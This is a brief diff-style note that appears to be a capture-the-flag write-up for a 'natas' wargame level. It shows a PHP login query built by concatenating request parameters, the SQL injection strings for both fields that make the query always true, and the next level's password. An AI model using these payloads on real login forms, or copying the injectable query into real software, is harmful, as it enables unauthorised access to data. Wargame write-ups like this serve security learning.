@@ -1,0 +1,8 @@
+PHP script queries a MySQL database with the username and password given.  If any line is returned, it will then
+spit out the credentials.  SQL injection to ensure that both the username predicate and the password predicate
+will both be true for all entries will dump out the entire database and pass the check
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 
+In username field =>  bob" OR "a"="a
+In password field =>  foo" OR "a"="a
+
+password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
